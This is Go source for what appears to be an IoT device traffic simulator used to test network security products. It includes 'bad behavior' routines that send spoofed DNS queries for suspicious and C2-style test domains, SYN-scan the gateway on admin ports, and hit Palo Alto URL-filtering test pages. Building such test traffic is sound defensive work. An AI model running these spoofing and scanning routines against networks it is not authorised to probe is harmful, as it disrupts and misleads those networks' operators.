func (d *iotDeviceRunner) badPANTestDomains(bCtx context.Context) {
	d.log("warning", "💀 PAN TEST DOMAINS behavior started (DNS Security + URL Filtering)")
	const panFallbackIP = "34.111.236.155"
	const panHost = "urlfiltering.paloaltonetworks.com"

	for d.isBadBehaviorActive(bCtx) {
		_, gw := d.getIPAndGateway()
		servers := append([]string{}, iotPublicDNS...)
		if gw != "" {
			servers = append(servers, gw)
		}
		for i := 0; i < 2; i++ {
			if !d.isBadBehaviorActive(bCtx) {
				return
			}
			domain := iotPANDNSTestDomains[rand.Intn(len(iotPANDNSTestDomains))]
			srv := servers[rand.Intn(len(servers))]
			sport := uint16(49152 + rand.Intn(16383))
			if d.sendSpoofedUDP(srv, sport, 53, buildDNSQueryPayload(domain), "bad_pan_dns") {
				d.log("warning", fmt.Sprintf("💀 [pan_test] DNS Security: %s → %s", domain, srv))
			}
			if !d.sleepBadBehavior(bCtx, 2*time.Second) {
				return
			}
		}
		if !d.sleepBadBehavior(bCtx, 10*time.Second) {
			return
		}

		// 1. Send DNS query for urlfiltering.paloaltonetworks.com from the IoT device IP first
		dnsSrv := servers[rand.Intn(len(servers))]
		sport := uint16(49152 + rand.Intn(16383))
		d.sendSpoofedUDP(dnsSrv, sport, 53, buildDNSQueryPayload(panHost), "bad_pan_dns")
		if !d.sleepBadBehavior(bCtx, 250*time.Millisecond) {
			return
		}

		// 2. Resolve live IP of urlfiltering.paloaltonetworks.com (fallback 34.111.236.155)
		panURLIP := resolveDomainIPv4(panHost, panFallbackIP)
		path := iotPANURLTestPaths[rand.Intn(len(iotPANURLTestPaths))]
		tlsHello := buildTLSClientHelloPayload(panHost)
		httpReq := buildHTTPGetPayload(panHost, path, d.httpUserAgent())
		if d.sendSpoofedTCPFlow(panURLIP, 443, tlsHello, "bad_pan_url") {
			d.log("warning", fmt.Sprintf("💀 [pan_test] URL Filter HTTPS: %s%s → %s:443", panHost, path, panURLIP))
		}
		if !d.sleepBadBehavior(bCtx, 3*time.Second) {
			return
		}
		if d.sendSpoofedTCPFlow(panURLIP, 80, httpReq, "bad_pan_url") {
			d.log("warning", fmt.Sprintf("💀 [pan_test] URL Filter HTTP: %s%s → %s:80", panHost, path, panURLIP))
		}
		if !d.sleepBadBehavior(bCtx, 90*time.Second) {
			return
		}
	}
}

func (d *iotDeviceRunner) badRandomMix(bCtx context.Context) {
	d.log("warning", "💀 RANDOM MIX behavior started")
	ports := []uint16{22, 23, 445, 3389, 8080}

	for d.isBadBehaviorActive(bCtx) {
		switch rand.Intn(3) {
		case 0:
			domain := iotSuspiciousDomains[rand.Intn(len(iotSuspiciousDomains))]
			srv := iotPublicDNS[rand.Intn(len(iotPublicDNS))]
			sport := uint16(50000 + rand.Intn(10000))
			if d.sendSpoofedUDP(srv, sport, 53, buildDNSQueryPayload(domain), "bad_dns") {
				d.log("warning", fmt.Sprintf("💀 [random] DNS: %s", domain))
			}
		case 1:
			_, gw := d.getIPAndGateway()
			if gw != "" {
				p := ports[rand.Intn(len(ports))]
				if d.sendSpoofedTCP(gw, p, tcpFlagSYN, nil, "bad_scan") {
					d.log("warning", fmt.Sprintf("💀 [random] Scan: %s:%d", gw, p))
				}
			}
		case 2:
			sport := uint16(49152 + rand.Intn(16383))
			if d.sendSpoofedUDP(iotPublicDNS[0], sport, 53, buildDNSQueryPayload("c2.malware-test.org"), "bad_beacon") {
				d.log("warning", "💀 [random] Beacon: c2.malware-test.org")
			}
		}
		wait := time.Duration(20+rand.Intn(41)) * time.Second
		if !d.sleepBadBehavior(bCtx, wait) {
			return
		}
	}
}

func bytesRepeat(b byte, n int) []byte {
	out := make([]byte, n)
	for i := range out {
		out[i] = b
	}
	return out
}

// ── Daemon IPC Loop & Metrics Reporter ───────────────────────────────────────

func runIoTMetricsReporter(ctx context.Context) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	const metricsPath = "/tmp/stigix-go-iot-metrics.json"
	for {
		select {
		case <-ctx.Done():
			_ = os.Remove(metricsPath)
			return
		case <-ticker.C:
			var m runtime.MemStats
			runtime.ReadMemStats(&m)
			payload := IoTGoMetrics{
				PID:              os.Getpid(),
				Goroutines:       runtime.NumGoroutine(),
				HeapAllocMB:      float64(m.Alloc) / (1024 * 1024),
				SysMemMB:         float64(m.Sys) / (1024 * 1024),
				ActiveIoTDevices: activeIoTDevices.Load(),
				TotalIoTPackets:  totalIoTPackets.Load(),
				TotalIoTBytes:    totalIoTBytes.Load(),
				Timestamp:        time.Now().Unix(),
			}
			_ = writeAtomicJSON(metricsPath, payload)
		}
	}
}

type iotDaemonCommand struct {
	Cmd      string        `json:"cmd"`
	DeviceID string        `json:"device_id"`
	MAC      string        `json:"mac"`
	IP       string        `json:"ip"`
	Gateway  string        `json:"gateway"`
	Device   IoTDeviceSpec `json:"device"`
}

func generateLAAMAC() string {
	b := make([]byte, 6)
	for i := range b {
		b[i] = byte(rand.Intn(256))
	}
	b[0] = (b[0] | 0x02) & 0xfe // Locally administered unicast
	return fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x", b[0], b[1], b[2], b[3], b[4], b[5])
}

func runIoTDaemonLoop(ctx context.Context, rawEng *iotRawEngine, dhcpMode string) {
	var (
		devMu   sync.Mutex
		devices = make(map[string]*iotDeviceRunner)
	)

	defer func() {
		devMu.Lock()
		for _, dev := range devices {
			dev.stop()
		}
		devMu.Unlock()
	}()

	emitIoTJSON("daemon_ready", map[string]any{
		"interface": rawEng.ifaceName,
		"dhcp_mode": dhcpMode,
		"engine":    "stigix-go",
	})

	scanner := bufio.NewScanner(os.Stdin)
	scanner.Buffer(make([]byte, 64*1024), 2*1024*1024)

	cmdCh := make(chan string, 64)
	go func() {
		for scanner.Scan() {
			cmdCh <- scanner.Text()
		}
		close(cmdCh)
	}()

	for {
		select {
		case <-ctx.Done():
			return
		case rawLine, ok := <-cmdCh:
			if !ok {
				return
			}
			line := strings.TrimSpace(rawLine)
			if line == "" {
				continue
			}
			var cmd iotDaemonCommand
			if err := json.Unmarshal([]byte(line), &cmd); err != nil {
				emitIoTJSON("daemon_error", map[string]any{"error": fmt.Sprintf("Invalid JSON command: %v", err)})
				continue
			}

			switch cmd.Cmd {
			case "start":
				spec := cmd.Device
				enabledTrue := true
				spec.Enabled = &enabledTrue
				if spec.ID == "" {
					emitIoTJSON("daemon_error", map[string]any{"error": "start command missing device.id"})
					continue
				}
				devMu.Lock()
				if _, exists := devices[spec.ID]; exists {
					devMu.Unlock()
					emitIoTJSON("daemon_error", map[string]any{"device_id": spec.ID, "error": "Device already running"})
					continue
				}

				// Duplicate MAC guard
				incomingMAC := strings.ToLower(strings.TrimSpace(spec.MAC))
				macConflict := false
				for _, existing := range devices {
					if strings.ToLower(existing.spec.MAC) == incomingMAC {
						macConflict = true
						break
					}
				}
				if macConflict {
					newMAC := generateLAAMAC()
					emitIoTJSON("daemon_warning", map[string]any{
						"device_id": spec.ID,
						"warning":   fmt.Sprintf("MAC collision: %s → reassigned %s", incomingMAC, newMAC),
					})
					spec.MAC = newMAC
				}

				startupIdx := len(devices)
				runner, err := newIoTDeviceRunner(ctx, spec, rawEng, dhcpMode)
				if err != nil {
					devMu.Unlock()
					emitIoTJSON("error", map[string]any{"device_id": spec.ID, "error": err.Error()})
					continue
				}
				devices[spec.ID] = runner
				devMu.Unlock()

				// Fast stagger in Go (200ms per device capped at 4s so DHCP server isn't burst-flooded)
				stagger := time.Duration(startupIdx)*200*time.Millisecond + time.Duration(rand.Intn(200))*time.Millisecond
				if stagger > 4*time.Second {
					stagger = 4*time.Second + time.Duration(rand.Intn(500))*time.Millisecond
				}
				go func(r *iotDeviceRunner, delay time.Duration) {
					if delay > 0 {
						select {
						case <-r.ctx.Done():
							return
						case <-time.After(delay):
						}
					}
					r.start()
				}(runner, stagger)

			case "stop":
				devMu.Lock()
				runner, ok := devices[cmd.DeviceID]
				if ok {
					delete(devices, cmd.DeviceID)
				}
				devMu.Unlock()
				if ok {
					runner.stop()
				} else {
					emitIoTJSON("daemon_error", map[string]any{"device_id": cmd.DeviceID, "error": "Device not found"})
				}

			case "stop_all":
				devMu.Lock()
				list := make([]*iotDeviceRunner, 0, len(devices))
				for _, r := range devices {
					list = append(list, r)
				}
				devices = make(map[string]*iotDeviceRunner)
				devMu.Unlock()
				for _, r := range list {
					r.stop()
				}
				emitIoTJSON("daemon_stopped_all", map[string]any{})

			case "status":
				devMu.Lock()
				st := make(map[string]any, len(devices))
				for id, r := range devices {
					ip, gw := r.getIPAndGateway()
					r.mu.RLock()
					running := r.running
					r.mu.RUnlock()
					st[id] = map[string]any{
						"running": running,
						"ip":      ip,
						"gateway": gw,
						"mac":     r.spec.MAC,
					}
				}
				devMu.Unlock()
				emitIoTJSON("daemon_status", map[string]any{"devices": st})

			case "enable_bad_behavior":
				iotBadBehaviorGlob.Store(true)
				devMu.Lock()
				count := 0
				for _, r := range devices {
					if r.spec.Security.BadBehavior {
						r.enableBadBehavior()
						count++
					}
				}
				devMu.Unlock()
				emitIoTJSON("bad_behavior_enabled", map[string]any{"activated_count": count})

			case "disable_bad_behavior":
				iotBadBehaviorGlob.Store(false)
				devMu.Lock()
				for _, r := range devices {
					r.disableBadBehavior()
				}
				devMu.Unlock()
				emitIoTJSON("bad_behavior_disabled", map[string]any{})

			case "release_dhcp":
				oldMAC := strings.TrimSpace(cmd.MAC)
				if oldMAC != "" {
					saved, hadLease := removeDHCPLease(oldMAC)
					releaseIP := strings.TrimSpace(cmd.IP)
					if releaseIP == "" && hadLease {
						releaseIP = saved.IP
					}
					releaseGW := strings.TrimSpace(cmd.Gateway)
					if releaseGW == "" && hadLease {
						releaseGW = saved.Gateway
					}
					if releaseGW == "" {
						releaseGW = detectHostDefaultGateway()
					}
					if releaseIP != "" && releaseIP != "0.0.0.0" {
						rawEng.UnregisterDeviceIP(releaseIP)
						if macBytes, err := parseMAC(oldMAC); err == nil {
							dstMAC := rawEng.ResolveDstMAC(releaseGW, releaseGW)
							if frame, ok := buildDHCPReleaseFrame(rand.Uint32(), dstMAC, macBytes, releaseIP, releaseGW); ok {
								_ = rawEng.SendFrame(frame)
							}
						}
					}
					emitIoTJSON("dhcp_released", map[string]any{"mac": oldMAC, "ip": releaseIP})
				}

			default:
				emitIoTJSON("daemon_error", map[string]any{"error": fmt.Sprintf("Unknown command: %s", cmd.Cmd)})
			}
		}
	}
}

func runIoTCLI(args []string) {
	fs := flag.NewFlagSet("iot", flag.ExitOnError)
	var (
		iface           string
		dhcpMode        string
		configFile      string
		daemonMode      bool
		jsonOut         bool
		enableBad       bool
		deviceID        string
		deviceName      string
		vendor          string
		deviceType      string
		macAddr         string
		ipStatic        string
		protocolsCSV    string
		trafficInterval int
		gateway         string
		fingerprintJSON string
		securityJSON    string
	)

	fs.StringVar(&iface, "interface", "eth0", "Network interface to use")
	fs.StringVar(&iface, "i", "eth0", "Network interface to use (shorthand)")
	fs.StringVar(&dhcpMode, "dhcp-mode", "auto", "DHCP mode: auto or static")
	fs.StringVar(&configFile, "config", "iot_devices.json", "Path to device configuration file")
	fs.StringVar(&configFile, "c", "iot_devices.json", "Path to device configuration file (shorthand)")
	fs.BoolVar(&daemonMode, "daemon", false, "Run in daemon mode (JSON over stdin/stdout)")
	fs.BoolVar(&jsonOut, "json-output", false, "Enable JSON output for Node.js IPC")
	fs.BoolVar(&enableBad, "enable-bad-behavior", false, "Enable bad behavior globally")

	// Single device flags
	fs.StringVar(&deviceID, "device-id", "", "Run in single device mode with this ID")
	fs.StringVar(&deviceName, "device-name", "", "Device name for single device mode")
	fs.StringVar(&vendor, "vendor", "Generic", "Vendor name for single device mode")
	fs.StringVar(&deviceType, "device-type", "IoT Device", "Device type for single device mode")
	fs.StringVar(&macAddr, "mac", "00:00:00:00:00:00", "MAC address for single device mode")
	fs.StringVar(&ipStatic, "ip-static", "", "Static IP for single device mode")
	fs.StringVar(&protocolsCSV, "protocols", "dhcp,arp,http", "Comma-separated protocols")
	fs.IntVar(&trafficInterval, "traffic-interval", 60, "Traffic interval in seconds")
	fs.StringVar(&gateway, "gateway", "", "Gateway IP")
	fs.StringVar(&fingerprintJSON, "fingerprint", "", "JSON-encoded DHCP fingerprint")
	fs.StringVar(&securityJSON, "security", "", "JSON-encoded security config")

	_ = fs.Parse(args)

	iotJSONOutput = jsonOut || daemonMode
	iotBadBehaviorGlob.Store(enableBad)

	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()

	rawEng, err := newIoTRawEngine(ctx, iface)
	if err != nil {
		if iotJSONOutput {
			emitIoTJSON("daemon_error", map[string]any{"error": err.Error()})
		} else {
			fmt.Fprintf(os.Stderr, "[STIGIX-GO IOT] Fatal raw socket error: %v\n", err)
		}
		os.Exit(1)
	}
	defer rawEng.Close()

	go runIoTMetricsReporter(ctx)

	if daemonMode {
		runIoTDaemonLoop(ctx, rawEng, dhcpMode)
		return
	}

	if deviceID != "" {
		enabled := true
		spec := IoTDeviceSpec{
			ID:              deviceID,
			Name:            deviceName,
			Vendor:          vendor,
			Type:            deviceType,
			MAC:             macAddr,
			IPStart:         ipStatic,
			Protocols:       strings.Split(protocolsCSV, ","),
			Enabled:         &enabled,
			TrafficInterval: trafficInterval,
			Gateway:         gateway,
		}
		if spec.Name == "" {
			spec.Name = deviceID
		}
		if fingerprintJSON != "" {
			_ = json.Unmarshal([]byte(fingerprintJSON), &spec.Fingerprint)
		}
		if securityJSON != "" {
			_ = json.Unmarshal([]byte(securityJSON), &spec.Security)
		}
		runner, err := newIoTDeviceRunner(ctx, spec, rawEng, dhcpMode)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Invalid device config: %v\n", err)
			os.Exit(1)
		}
		runner.start()
		<-ctx.Done()
		runner.stop()
	}
}
